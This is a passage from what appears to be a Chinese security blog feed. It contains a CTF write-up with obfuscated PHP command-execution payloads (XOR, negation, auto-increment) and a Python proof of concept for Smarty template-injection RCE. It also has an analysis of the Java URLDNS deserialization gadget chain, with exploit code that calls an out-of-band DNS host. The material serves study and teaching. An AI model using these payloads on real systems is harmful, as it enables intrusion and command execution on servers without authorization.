class="comment"># 对ans1进行重新赋值</span></span><br><span class="line">ans2 = <span class="string">&quot;&quot;</span>  <span class="comment"># 对ans2进行重新赋值</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(myb)):  <span class="comment"># 设置k的范围为(0,len(myb))</span></span><br><span class="line">    myfun(k, myb)  <span class="comment"># 再次引用自定义函数</span></span><br><span class="line">data2 = <span class="string">&quot;(\&quot;&quot;</span> + urllib.request.quote(ans1) + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + urllib.request.quote(ans2) + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line"><span class="built_in">print</span>(data2)</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=(<span class="string">&#x27;%0C%05%0C%08%05%0D&#x27;</span>^<span class="string">&#x27;%7F%7C%7F%7C%60%60&#x27;</span>)(<span class="string">&quot;%03%01%08%00%00%06%0C%01%07&quot;</span>^<span class="string">&quot;%60%60%7C%20/%60%60%60%60&quot;</span>);</span><br></pre></td></tr></table></figure><p>或者用取反：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code=[~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>][!%FF]([~%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8</span>B%DF%D0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span>][!%FF]);</span><br><span class="line"><span class="comment">//system(&#x27;cat /flag&#x27;)</span></span><br></pre></td></tr></table></figure><p>自增：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">code=%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">5</span>B%<span class="number">5</span>D.<span class="string">&#x27;&#x27;</span>%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">5</span>B<span class="string">&#x27;&#x27;</span>%<span class="number">3</span>D%<span class="number">3</span>D<span class="string">&#x27;%24&#x27;</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>___.%<span class="number">24</span>__.%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>.%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B_%<span class="number">5</span>D(%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B__%<span class="number">5</span>D)%<span class="number">3</span>B</span><br><span class="line"></span><br><span class="line"><span class="comment">//$_=[].&#x27;&#x27;;$_=$_[&#x27;&#x27;==&#x27;$&#x27;];$_++;$_++;$_++;$_++;$__=$_;$_++;$_++;$___=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_=$___.$__.$_;$_=&#x27;_&#x27;.$_;$$_[_]($$_[__]);</span></span><br><span class="line"><span class="comment">//$_GET[_]($_GET[__])</span></span><br></pre></td></tr></table></figure><h2 id="level27"><a href="#level27" class="headerlink" title="level27"></a>level27</h2><p>模板注入导致的RCE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Smarty</span>\<span class="title">Smarty</span>;</span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">gettype</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]) === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$file_path</span> = <span class="string">&quot;file://&quot;</span> . <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;/pages/&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="variable">$file_path</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /?page=home&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>用的是Smarty模板，题目溯源到<a href="https://blog.hamayanhamayan.com/entry/2024/08/20/092636">idekCTF 2024 untitled-smarty-challenge</a></p><p>poc：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;&quot;</span></span><br><span class="line">cwd = <span class="string">&#x27;/app&#x27;</span></span><br><span class="line"></span><br><span class="line">target_file = <span class="string">&#x27;../&#123;Closure::fromCallable(system)-&gt;__invoke(&quot;cat /flag-*&quot;)&#125;/../../pages/about&#x27;</span></span><br><span class="line">w1 = requests.get(URL + <span class="string">&quot;?page=&quot;</span> + quote(target_file))</span><br><span class="line"><span class="built_in">print</span>(w1.status_code)</span><br><span class="line"><span class="built_in">print</span>(w1.text)</span><br><span class="line"></span><br><span class="line">filehash = hashlib.sha1(<span class="string">f&quot;//<span class="subst">&#123;cwd&#125;</span>/pages/<span class="subst">&#123;target_file&#125;</span><span class="subst">&#123;cwd&#125;</span>/templates/&quot;</span>.encode())</span><br><span class="line">template_c_file = filehash.hexdigest() + <span class="string">&quot;_0.file_&quot;</span> + target_file.split(<span class="string">&quot;/&quot;</span>)[-<span class="number">1</span>] + <span class="string">&quot;.php&quot;</span></span><br><span class="line">template_c_file_path = <span class="string">&quot;../templates_c/&quot;</span> + template_c_file</span><br><span class="line"></span><br><span class="line">w2 = requests.get(URL + <span class="string">&quot;?page=&quot;</span> + template_c_file_path)</span><br><span class="line"><span class="built_in">print</span>(w2.status_code)</span><br><span class="line"><span class="built_in">print</span>(w2.text)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> wp </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLDNS链分析</title>
      <link href="/archives/94b84d0b/"/>
      <url>/archives/94b84d0b/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><code>HashMap</code>实现了<code>Serializable</code>接口，可对<code>HashMap</code>对象进行反序列化操作</p><p><img src="/archives/94b84d0b/QQ20250428-211946.png"></p><p><code>URLDNS</code>是ysoserial中利用链的一个名字，因为<code>URLDNS gadget</code>触发结果是一次DNS请求，在目标没有回显的时候，能通过DNS请求得知是否存在反序列漏洞，所有通常用于检查是否存在Java反序列化。</p><p>该利用链特点：</p><ul><li><strong>不限制jdk版本，使用的Java内置类，对第三方依赖没有要求</strong></li><li><strong>目标无回显，可以通过DNS请求验证是否存在反序列化漏洞</strong></li><li><strong>URLDNS利用链，只能发起DNS请求，并不能进行其他利用</strong></li></ul><p>该利用链原理就是<code>HashMap</code>类重写了<code>readObject</code>方法，<code>readObject</code>方法会读取一个序列化文件流，在<code>readObject</code>方法中的<code>putVal</code>方法会调用<code>hash</code>方法，<code>hash</code>方法下会调用URL类的<code>hashCode</code>方法，当<code>hashCode</code>属性不等于<code>-1</code>，会调用<code>handler.hashCode</code>方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()-&gt;HashMap.putVal()-&gt;HashMap.hash()-&gt;URL.hashCode()</span><br></pre></td></tr></table></figure><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>exp:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        URL url= <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://jrez39tc8ig53y7prbebzx9s1j7av1jq.oastify.com&quot;</span>);</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line"></span><br><span class="line">        hashmap.put(url,<span class="number">22</span>);</span><br><span class="line">        Serialize(hashmap);</span><br><span class="line">        Unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title function_">Serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\学习\\web\\java学习\\test.ser&quot;</span>));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">        <span class="comment">// 刷新</span></span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\学习\\web\\java学习\\test.ser&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> in.readObject();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在readObject处下个断点，当执行到<code>Unserialize();</code>就会执行我们的hashmap的readObject()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在函数最后会执行putVal，里面执行hash(key)，这里的key就是我们传入的URL:</p><p><img src="/archives/94b84d0b/image-20250528152638217.png" alt="image-20250528152638217"></p><p>继续跟进：</p><p><img src="/archives/94b84d0b/image-20250528152431944.png" alt="image-20250528152431944"></p><p>在hashmap.hash()中会判断key是否为空，不是就执行URL.hashCode()方法：</p><p><img src="/archives/94b84d0b/image-20250528153947116.png" alt="image-20250528153947116"></p><p>这里判断hashCode的值是否为-1，是的话执行handler.hashCode(this)方法，而hashCode默认值为-1：</p><p><img src="/archives/94b84d0b/image-20250528154227921.png" alt="image-20250528154227921"></p><p>但这里需要注意，由于HashMap对象需要的参数是一个<strong>键值对</strong>，所以我们通过<code>hashmap.put(url,22);</code>将URL与22建立映射，后续可以通过 <code>url</code> 快速查找并获取其关联的值 <code>22</code>（例如 <code>hashmap.get(url)</code> 返回 <code>22</code>）：</p><p><img src="/archives/94b84d0b/image-20250528184241208.png" alt="image-20250528184241208"></p><p>而细看put的源码可以发现该方法会与readObject()执行一样的函数，所以当执行了<code>put(url,22)</code>我们的hashCode值就已经变了，所以我们修正下exp将hashCode值改回去：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        URL url= <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://jrez39tc8ig53y7prbebzx9s1j7av1jq.oastify.com&quot;</span>);</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();  <span class="comment">//获取URL类</span></span><br><span class="line">        Field hashcode= c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcode.setAccessible(<span class="literal">true</span>); <span class="comment">//hashCode属性是私有的</span></span><br><span class="line">        </span><br><span class="line">        hashmap.put(url,<span class="number">22</span>);</span><br><span class="line">        hashcode.set(url,-<span class="number">1</span>);  <span class="comment">//在put方法后，重新将url对象的hashCode赋值-1</span></span><br><span class="line">        Serialize(hashmap);</span><br><span class="line">        Unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title function_">Serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\学习\\web\\java学习\\test.ser&quot;</span>));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">        <span class="comment">// 刷新</span></span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\学习\\web\\java学习\\test.ser&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> in.readObject();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改后继续刚才的步骤，handler为URLStreamHandler对象，所以将会执行URLStreamHandler.hashCode(this)方法：</p><p><img src="/archives/94b84d0b/image-20250528153243689.png" alt="image-20250528153243689"></p><p>第一个获取URL协议，第二个获取主机，跟进URLStreamHandIer.getHostAddress(u):</p><p><img src="/archives/94b84d0b/image-20250528153416474.png" alt="image-20250528153416474"></p><p>调用了URL.getHostAddress():<br><img src="/archives/94b84d0b/image-20250528153532099.png" alt="image-20250528153532099"></p><p>其中<code>InetAddress.getByName(host)</code>的作⽤是<strong>根据主机名，获取其IP地址</strong>，在⽹络上其实就是⼀次DNS查询。</p><p>而测试后会发现DNSLOG有两条记录，即一条为hashmap.put()的，一条为readObject()的</p><p><img src="/archives/94b84d0b/image-20250528203517906.png" alt="image-20250528203517906"></p><p>完整利用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Hashmap.readObject()-&gt;</span><br><span class="line">Hashmap.hash()-&gt;</span><br><span class="line">java.net.URL.hashCode()-&gt;</span><br><span class="line">java.net.URLStreamHandler.hashCode()-&gt;</span><br><span class="line">java.net.URLStreamHandler.getHostAddress()-&gt;</span><br><span class="line">java.net.URL.getHostAddress()-&gt;</span><br><span class="line">InetAddress.getByName();</span><br></pre></td></tr></table></figure><p>而对比官方的ysoserial中的URLDNS.java的exp:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); </span><br><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); </span><br><span class="line">ht.put(u, url); </span><br><span class="line">Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); </span><br><span class="line"><span class="keyword">return</span> ht;</span><br></pre></td></tr></table></figure><p>在ysoserial中添加了一个URLStreamHandler的handler，根据注解可以得知它的作用是为了避免<strong>在执行payload时候执行DNS解析</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line"><span class="comment">//在创建payload期间避免DNS解析</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line"><span class="comment">//因为字段java.net.URL.handler是transient（瞬态的），所以它不会成为序列化payload的一部分。</span></span><br></pre></td></tr></table></figure><p>SilentURLStreamHandler：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"><span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进SilentURLStreamHandler方法可以看到是一个自定义的静态类，继承URLStreamHandler。里面重写了getHostAddress(URL u)方法。使其在执行put方法时不会引起DNS解析，因为子类重写方法会覆盖父类方法，所以最后调用getHostAddress方法时只会返回null</p><p>而由于字段<strong>java.net.URL.handler是transient（瞬态的），所以它不会成为序列化payload的一部分</strong>。即序列化时SilentURLStreamHandler方法不会被序列化，所以当反序列化时JVM会重新初始化handler，即原始URLStreamHandler类中的getHostAddress方法触发DNS解析</p><p>完整exp：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        URLStreamHandler handler=<span class="keyword">new</span> <span class="title class_">silentURLStreamHandler</span>();</span><br><span class="line">        URL url=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>,<span class="string">&quot;http://jrez39tc8ig53y7prbebzx9s1j7av1jq.oastify.com&quot;</span>,handler);</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">        hashmap.put(url,<span class="number">22</span>);</span><br><span class="line"></span><br><span class="line">        Class c=url.getClass();  <span class="comment">//获取URL类</span></span><br><span class="line">        Field hashcode=c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>); <span class="comment">//利用反射获取hashCode属性</span></span><br><span class="line">        hashcode.setAccessible(<span class="literal">true</span>);  <span class="comment">//hashCode属性是私有的</span></span><br><span class="line">        hashcode.set(url,-<span class="number">1</span>); <span class="comment">//put方法后，重新将hashCode设置回-1</span></span><br><span class="line"></span><br><span class="line">        serialize(hashmap);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\学习\\web\\java学习\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream output=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        output.writeObject(obj);</span><br><span class="line">        <span class="comment">// 刷新</span></span><br><span class="line">        output.flush();</span><br><span class="line">        output.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span 